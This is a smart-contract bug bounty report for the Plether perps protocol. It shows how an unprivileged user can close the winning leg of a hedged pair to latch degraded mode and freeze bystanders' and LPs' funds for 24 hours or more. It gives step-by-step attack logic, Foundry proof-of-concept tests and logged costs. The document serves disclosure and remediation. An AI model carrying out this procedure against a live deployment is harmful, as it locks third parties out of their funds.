# \#98269 [SC-High] Permissionless degraded-mode latch in CfdEngine (`_enterDegradedModeIfInsolvent`) lets any user freeze open-position bystanders' free settlement and all LP settlement for 24h+ by closing the winning leg of a hedged pair

**Submitted on Nov 6th 2026 at 15:33:41 UTC by @thorthumbz00 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98269
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

Degraded mode is the protocol's automatic insolvency containment. After any close or liquidation it latches when raw post-op effective cash `E` falls below the larger side's maximum directional liability `L`, with the settlement buffer `B` excluded from `E`. While latched it blocks the free-settlement withdrawal of any trader that still holds an open position, all LP epoch settlement and LP redemptions, LP entry, and new opens. Only the Engine owner can clear it.

Any unprivileged, direction-neutral user can arm this latch at will. The attacker opens a hedged long and short pair sized to fill pool capacity, then closes only the winning leg. The winner's payout lowers `E` while the still-open loser keeps `L` high, so `E < L` and the latch fires even though the pair's net exposure is zero and the pool is whole. The latch outlives the condition: it stays set after the attacker unwinds and the pool is solvent again, and only an owner action clears it. At the deployment risk parameters a bystander's 19,999.999999 USDG of free settlement is held for 24 hours and more for an attacker cost of 6,804.943344 USDG, and the attacker recovers most of its capital.

## Vulnerability Details

The latch is set in `CfdEngine._enterDegradedModeIfInsolvent` (`packages/perps/src/CfdEngine.sol:1351-1369`): it computes `effectiveAssetsAfter` (`E`) net of pending pool payouts, reads `maxLiabilityAssets` (`L`) from `_maxLiability()`, and sets `degradedMode = true` whenever `E < L` (`:1365-1366`). This runs after every close. Closing the winning leg of a hedged pair reduces `E` by the payout while the still-open loser continues to set `L`, so the raw comparison latches although the pair is directionally neutral and the pool is whole.

This is the documented containment rule. SECURITY.md:340 states it verbatim:

> Degraded containment | If a close or liquidation leaves raw post-op `E < L`, `degradedMode` latches and blocks further risk expansion while still permitting protective transitions; `B` is deliberately excluded

The documented purpose is to block risk EXPANSION while permitting protective transitions. The flaw is the reach and the collateral damage, neither of which is documented. First, a neutral hedged pair can drive `E < L` on demand at negligible net cost, so the containment state is attacker-controlled. Second, while latched the automatic gate stops third parties who are not expanding risk at all:

- `CfdEngineSettlementSidecar.sol:274-276` reverts `CfdEngine__DegradedMode` on the trader withdrawal and settlement path for an account that holds an open position, so a bystander's already-funded free settlement cannot be withdrawn without first closing the position.
- `HousePool.sol:1864-1869` (`_requireWithdrawalsLive`) reverts `HousePool__DegradedMode` and blocks LP epoch settlement and already-funded LP redemptions.

EMERGENCY_RESPONSE_GUIDE.md:45-48 describes the latch and that the owner clears it:

> Engine degraded mode latches when a close or liquidation leaves raw `E < L` [...] It blocks new risk, LP entry, and all LP epoch settlement. The Engine owner can call `clearDegradedMode()` once raw `E >= L`. Restoring the separate settlement-buffer target is not required to clear the latch.

The same guide states at :41 that the manual pause and settlement-hold controls do NOT stop already-funded claims. The automatic latch does stop them, and that consequence for already-funded third-party claims is undocumented.

Clearing is owner-only. `CfdEngine.clearDegradedMode` (`packages/perps/src/CfdEngine.sol:658-667`) carries `onlyOwner` and reverts `CfdEngine__StillInsolvent` while `E < L`, so if the attacker leaves the losing leg open the owner cannot clear without first recapitalizing the shortfall from its own wallet.

The trigger is permissionless. The proof-of-concept asserts that neither attacker identity is the Engine owner. No oracle manipulation and no flash loan is needed.

## Impact Details

Temporary freezing of funds for at least 24 hours (impact 6400). In the headline test at the deployment risk parameters a bystander trader holds an open long with 20,000 USDG of free settlement funded beside a 2,000 USDG margin. The attacker's public-router close latches degraded mode (`E` falls to 987,306.898545 USDG, log `pool assets after winner close 987306898545`, against `L` of 997,900.00 USDG, log `max liability after winner close 997900000000`), and from that point:

- The bystander's `withdrawMargin` reverts `CfdEngine__DegradedMode`. Its free settlement reads 19,999.999999 USDG (log `victim free held 19999999999`) and stays frozen; 24 hours later (log `hours frozen 24`), with a fresh mark and nobody having acted, the same call still reverts and nothing has moved.
- LP epoch settlement reverts `HousePool__DegradedMode`.
- A new open through the router is refused.

The latch outlives solvency. After the attacker unwinds both legs the pool holds 1,007,619.946281 USDG (log `pool assets after unwind 1007619946281`) against a 10,000.00 USDG liability (log `max liability after unwind 10000000000`), yet `degradedMode` is still true. The attacker's two legs are flat at that point and withdraw normally while the latch stands, which confirms that a flat account can still exit; the frozen set is bystanders who hold an open position plus LP settlement, LP redemptions, and new LP entry, not every holder of free cash. Only the owner's `clearDegradedMode` lifts it, after which the bystander withdraws the full 19,999.999999 USDG (log `victim exit after the owner clears 19999999999`).

If the attacker leaves the losing leg open, the owner cannot clear without recapitalizing 22,726.143558 USDG from its own wallet (`test_H03_owner_cannot_clear_while_loser_open_recap_cost`, log `owner recap paid to lift the freeze (USDG): 22726143558`), and the latch re-arms on the next cycle after a recapitalization (`test_S27_SecondCycleRelatch_BystanderHeldEachCycle`, log `recap spent to lift cycle one 97711998957`).

USDG is the dollar-denominated settlement token with 6 decimals, so one USDG is effectively one dollar. The owner can clear, so this is temporary (High 6400), not permanent.

### Before / after state delta (headline test, release parameters, USDG, 6 decimals)

| Account / state | Before | After (latched, +24h) | Delta / effect |
|---|---|---|---|
| open-position bystander free cash | 19,999.999999 withdrawable (`victim free held 19999999999`) | `withdrawMargin` reverts `DegradedMode`; nothing moved | frozen 24h+ (`hours frozen 24`) |
| LP epoch settlement | runs | `settleLpEpoch` reverts `HousePool__DegradedMode` | frozen |
| pool vs liability (after fill, then after unwind) | `E` 1,002,000.413259 (`pool assets after fill 1002000413259`), `L` 997,900.00 (`max liability after fill 997900000000`) | pool 1,007,619.946281 (`pool assets after unwind 1007619946281`), `L` 10,000.00 (`max liability after unwind 10000000000`), yet `degradedMode == true` | latch outlives solvency |
| attacker (both legs) | 59,574.00 paid in (`attacker paid in 59574000000`) | 52,769.056656 out (`attacker paid out 52769056656`) | minus 6,804.943344 cost (`attacker cost 6804943344`) per cycle |
| same bystander after owner clears | frozen | 19,999.999999 withdrawn (`victim exit after the owner clears 19999999999`) | freed only by an owner action |

All figures are integers from the captured logs (F31Release.log for the headline figures; TriageDegraded.log for the re-arm and owner-recap figures) divided by 1e6; the raw integers are in the captured-output block of F31-poc.md.

**Honest bounds.** Trigger: any EOA, no privileged role; the proof-of-concept asserts neither attacker leg is the owner. Capital: a hedged pair funded to about 99.6% of pool capacity (log `attacker long lots 9879` / `attacker short lots 9979`) plus margin; at the release parameters the net cost of one cycle is 6,804.943344 USDG and the attacker recovers most of its outlay (59,574.00 paid in, 52,769.056656 out). A 1 percent mark move is enough (`test_N1b_OnePercentMoveIsEnough`). No oracle manipulation and no flash loan. Repeatable: the latch re-arms on the next cycle after a recapitalization (`test_S27`). A pause does not help: degraded mode is itself the containment state and is cleared only by the owner's `clearDegradedMode`; owner action is the only remedy, and the finding is that this is reachable at will against third parties. The tests install the DEPLOYMENT.md:130-137 release risk parameters (O1Latch `_riskParams`: `vpiFactor 0.01e18`, `maxSkewRatio 0.4e18`, `maintMarginBps 10`, `initMarginBps 20`, `fadMarginBps 300`, `baseCarryBps 500`), so the numbers are the release configuration, not a tuned fixture.

**Recommended fix.** Let degraded mode clear permissionlessly (or auto-clear) once raw `E >= L` holds again, and do not block a bystander's free-settlement withdrawal or an already-funded LP redemption that does not expand directional risk. Then a neutral hedged pair cannot weaponize the latch to freeze third-party funds until an owner acts.

## References

- Vulnerable code at the pinned build `a82d4fefb02768e5b3bddcc97dee371eee24fea8`:
  - `packages/perps/src/CfdEngine.sol:1351-1369` (`_enterDegradedModeIfInsolvent`, raw `E < L` latch after every close)
  - `packages/perps/src/CfdEngine.sol:658-667` (`clearDegradedMode`, `onlyOwner`, reverts `CfdEngine__StillInsolvent` while `E < L`)
  - `packages/perps/src/CfdEngineSettlementSidecar.sol:274-276` (open-position trader withdrawal and settlement blocked while degraded)
  - `packages/perps/src/HousePool.sol:1864-1869` (`_requireWithdrawalsLive`, LP epoch settlement and redemptions blocked while degraded)
- Release risk parameters: `packages/perps/DEPLOYMENT.md:128-156` (table: `vpiFactor 0.01e18`, `maxSkewRatio 0.4e18`, `maintMarginBps 10`, `initMarginBps 20`, `fadMarginBps 300`, `baseCarryBps 500`, `settlementBufferBps 25`).
- Documented behavior quoted above (the latch and the owner clear, not the permissionless reachability, the open-position trader free-cash block, or the LP freeze): `SECURITY.md:340`, `EMERGENCY_RESPONSE_GUIDE.md:41-48`.
- Dedup: the only adjacent prior item is Cecuro LOW-73 (Acknowledged, "Trader cannot add new stop-loss protection while degraded mode is active"), one consequence of degraded mode; it does not describe the permissionless hedged latch, the blocked trader free-settlement withdrawals, or the LP freeze. Not in the program known issues.
- PoC source and logs: see F31-poc.md and the secret Gist (`the secret Gist linked in the PoC Link field`); fork/harness detail in that file.


## Link to Proof of Concept

https://gist.github.com/tdev00/7014223848bbdf9e64423253c478c7e0

## Proof of Concept

## Proof of Concept

**Attack, step by step (as the headline test executes it, release parameters from DEPLOYMENT.md).**

1. The test first asserts that neither attacker leg is the Engine owner, so the whole attack runs with no privilege (`assertTrue(engine.owner() != ALICE && engine.owner() != BOB)`).
2. A bystander trader opens a healthy long of 10,000e18 at mark 1e8 with 2,000 USDG margin and 20,000 USDG of free settlement funded beside it. This open is driven by a pranked router call into `engine.processOrderTyped` (helper `_op`, `vm.prank(address(router))`): the harness posts positions and marks with the router's authority rather than through the public router, so the book is set up through the engine. The test records the free balance owed and the pool size.
3. The attacker funds a long account and a short account and fills both sides to about 99.6 percent of pool capacity (9,879 long lots and 9,979 short lots), again through the pranked `_op` path. Degraded mode is confirmed off at this point.
4. An ordinary 2 percent down move is posted (mark 0.98e8, through the pranked `_mark` helper, which calls `engine.updateMarkPrice`). The bystander withdraws 1 unit to prove it can still exit before the latch.
5. The winning leg closes through the PUBLIC router, with no cheat: the attacker calls `router.commitOrder` with a close request (targetPrice 2e8), and a separate keeper account calls `router.executeOrder` with mock Pyth update data. The result status is `Executed` and `engine.degradedMode()` is now true, so the latch was armed by a public order. Pool effective cash has fallen to 987,306.898545 USDG against an unchanged 997,900.00 USDG liability.
6. The bystander's `withdrawMargin(1)` reverts `CfdEngine__DegradedMode`. Its free settlement (19,999.999999 USDG) is frozen while it holds the open long.
7. The attacker unwinds the losing short (helper `_cl`, again a pranked `engine.processOrderTyped` close) and both attacker legs exit. The pool now holds 1,007,619.946281 USDG against a 10,000.00 USDG liability and is solvent again, yet `degradedMode` is still true: the latch outlives the condition. Both attacker legs are flat and withdraw normally while the latch stands, which shows a flat account can still exit. Attacker paid in 59,574.00 USDG, out 52,769.056656 USDG, for a net cost of 6,804.943344 USDG.
8. Time advances 24 hours and a fresh mark is posted. Nobody has acted. The bystander's `withdrawMargin(1)` reverts `CfdEngine__DegradedMode` again, its balance is unchanged, and the latch still stands. Hours frozen is logged as 24.
9. LP epoch settlement is attempted (`pool.settleLpEpoch`) and reverts `HousePool__DegradedMode`.
10. A would-be new opener is funded and calls `router.commitOrder` to open; it reverts. This check uses a bare `vm.expectRevert()` that does not pin the revert selector, so it proves the open is refused while latched but not the specific reason.
11. The Engine owner calls `clearDegradedMode`. Because the attacker already unwound, the pool is solvent and the clear succeeds with no recapitalization. `degradedMode` is now false and the bystander withdraws its full 19,999.999999 USDG. Only an owner action freed it.

Honest limits of this proof-of-concept. Only the latching close uses the public commit and execute path. The capacity fill, the bystander open, the loser unwind, and the mark updates are driven by pranked router calls into `engine.processOrderTyped` and `engine.updateMarkPrice` (each `vm.prank(address(router))`), so the hedged book itself is set up through the engine rather than the public router; a submission-grade proof-of-concept should route those legs through the public router too. The new-open refusal uses a bare `vm.expectRevert()` that does not pin the selector. Only Pyth and USDG are mocked (the harness `MockPyth` and the mock settlement token), which the rules permit.

The second runnable test, `test_N1e_LatchThroughPublicCloseOrder`, confirms the latching close by itself through the public router: it fills both sides, posts the move, closes the winning leg with `router.commitOrder` and `router.executeOrder`, then asserts `degradedMode()` is true and the bystander's `withdrawMargin(1)` reverts. The third, `test_N1_HedgedPairLatchesDegradedAndHoldsVictims`, runs the same full narrative at the base parameters with the close driven through the pranked engine path and additionally shows the latch re-arming on a second cycle.

**Runnable tests.** Three Foundry tests that run through the `BasePerpTest` harness. Only Pyth and USDG are mocked (the harness `MockPyth` and the mock settlement token), which the rules permit. The full test files (`F31Release.t.sol`, `TriageDegraded.t.sol`, `O1Custody.t.sol`) and the captured forge logs are in the secret Gist linked below.

Steps:
1. Clone `github.com/immunefi-team/audit-comp-plether` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8` (submodules included) and install solc 0.8.35 (the repository's pinned compiler).
2. Create `poc/` at the repository root and copy `F31Release.t.sol`, `TriageDegraded.t.sol`, and `O1Custody.t.sol` into it. The root `foundry.toml` remaps `@plether/perps/<File>.sol` to `packages/perps/src/<File>.sol`; the files import the harness as `../packages/perps/test/perps/BasePerpTest.sol`.
3. Run, from the repository root, with the test directory pointed at `poc/` (the repository's own test and script trees are skipped so only the attached files compile as tests):
   ```
   export FOUNDRY_TEST=poc FOUNDRY_SKIP='["test/**","script/**"]'
   forge test --match-path poc/F31Release.t.sol --match-test test_F31_ReleaseParams_PublicRouterCloseLatchesAndHoldsVictims -vv
   forge test --match-path poc/TriageDegraded.t.sol --match-test test_N1_HedgedPairLatchesDegradedAndHoldsVictims -vv
   forge test --match-path poc/O1Custody.t.sol --match-test test_N1e_LatchThroughPublicCloseOrder -vv
   ```
   The first compile takes a few minutes (via_ir). Each test prints `[PASS]` with the figures below.

The impact section also cites three tests in `TriageDegraded.t.sol` that corroborate the re-arm and owner-recap claims; run them from the same file with `--match-test test_N1b_OnePercentMoveIsEnough`, `--match-test test_H03_owner_cannot_clear_while_loser_open_recap_cost`, and `--match-test test_S27_SecondCycleRelatch_BystanderHeldEachCycle`.

Headline test (release parameters), the public-router latch with the victim and liveness assertions (`F31Release.t.sol`):

```solidity
// neither attacker leg holds any privilege
assertTrue(engine.owner() != ALICE && engine.owner() != BOB, "attacker is not the owner");       // :209

// bystander opens a healthy long with free settlement beside it (pranked engine open via _op; margin 2000e6, free 20_000e6)
_op(TRADER, CfdTypes.Side.LONG, 10_000e18, margin, 1e8);                                           // :215
// attacker fills both sides to pool capacity (pranked engine opens via _op)
(uint256 longLots, uint256 shortLots) = _fillBothSides(1e8);                                       // :221

// ordinary 2 percent down move (pranked _mark), then prove the bystander can exit BEFORE the latch
uint256 p = 0.98e8; _mark(p);                                                                      // :230-231
assertTrue(_tryWithdraw(TRADER, 1), "victim exits before the latch");                              // :232

// the winning leg closes through the PUBLIC router: commit by the attacker, execute by any keeper
vm.prank(ALICE);
uint64 id = router.commitOrder(request);                         // request.isClose = true, targetPrice 2e8  :239-240
bytes[] memory data = _mockPythUpdateData(p);
vm.prank(KEEPER);
OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);                        // :243
assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close executed");    // :244
assertTrue(engine.degradedMode(), "latched by a public order");                                    // :245

// open-position bystander held
vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
vm.prank(TRADER); clearinghouse.withdrawMargin(1);                                                  // :251-253

// attacker unwinds the loser (pranked engine close via _cl); pool whole again, latch stays; flat legs exit
_cl(BOB, CfdTypes.Side.SHORT, shortLots * 1e20, p);                                                 // :260
assertGe(poolAfterUnwind, liabilityAfterUnwind, "solvent again");                                   // :265
assertTrue(engine.degradedMode(), "latch outlives the condition");                                  // :266
_exit(ALICE); _exit(BOB);                                                                           // :267-268 flat accounts withdraw while latched

// 24 hours later, nobody has acted
_next(24 hours); _mark(p);                                                                          // :282-284
vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
vm.prank(TRADER); clearinghouse.withdrawMargin(1);                                                  // :285-286
assertLt(settlementToken.balanceOf(TRADER), owedFree, "trader free settlement held after 24 hours");// :287
assertTrue(engine.degradedMode(), "latch still stands after 24 hours");                             // :289

// LP epoch settlement frozen
vm.prank(address(router));
vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
pool.settleLpEpoch(snapshot.markPrice, snapshot.markTime);                                           // :291-294

// new open refused through the router (bare expectRevert, selector NOT pinned)
vm.prank(PEER); vm.expectRevert(); router.commitOrder(openRequest);                                 // :299-301

// only the owner clears; then the bystander gets the whole free balance
try engine.clearDegradedMode() { cleared = true; } catch { cleared = false; }                       // :307-311
assertTrue(cleared, "owner clear succeeds once solvent");                                            // :313
assertEq(_exit(TRADER), owedFree, "owner route frees the full balance");                            // :315-317
```

Public-router confirmation by itself (`O1Custody.t.sol`):

```solidity
function test_N1e_LatchThroughPublicCloseOrder() public {
    _op(TRADER, CfdTypes.Side.LONG, 10_000e18, 2000e6, 1e8);        // bystander long (pranked engine open)
    (uint256 longLots,) = _fillBothSides(1e8);                      // attacker fills capacity (pranked)
    uint256 p = 0.98e8; _mark(p);                                   // 2 percent down
    OrderV3Types.OrderRequest memory request = _floorRequest(longLots * 1e20, 0, 0, type(uint256).max);
    request.isClose = true; request.targetPrice = 2e8;
    vm.prank(ALICE); uint64 id = router.commitOrder(request);       // PUBLIC router
    bytes[] memory data = _mockPythUpdateData(p);
    vm.prank(KEEPER);
    OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
    assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close executed");
    assertTrue(engine.degradedMode(), "latched by a public order");
    vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
    vm.prank(TRADER); clearinghouse.withdrawMargin(1);             // bystander held
}
```

Captured output (`F31Release.log`, `TriageDegraded.log`, `O1Custody.log` in the Gist):

```
[PASS] test_F31_ReleaseParams_PublicRouterCloseLatchesAndHoldsVictims() (gas: 12324911)
Logs:
  attacker long lots 9879
  attacker short lots 9979
  pool assets after fill 1002000413259
  max liability after fill 997900000000
  pool assets after winner close 987306898545
  max liability after winner close 997900000000
  victim free held 19999999999
  pool assets after unwind 1007619946281
  max liability after unwind 10000000000
  attacker paid in 59574000000
  attacker paid out 52769056656
  attacker cost 6804943344
  pool start 1002000499001
  pool end 1007619946281
  hours frozen 24
  owner clearDegradedMode succeeded 1
  victim exit after the owner clears 19999999999

# TriageDegraded.log (base parameters and the corroborating tests):
[PASS] test_N1_HedgedPairLatchesDegradedAndHoldsVictims() (gas: 15318256)
[PASS] test_N1b_OnePercentMoveIsEnough() (gas: 5851192)
[PASS] test_H03_owner_cannot_clear_while_loser_open_recap_cost() (gas: 10247011)   Logs: owner recap paid to lift the freeze (USDG): 22726143558
[PASS] test_S27_SecondCycleRelatch_BystanderHeldEachCycle() (gas: 9873276)         Logs: recap spent to lift cycle one 97711998957

# O1Custody.log:
[PASS] test_N1e_LatchThroughPublicCloseOrder() (gas: 8816202)
```

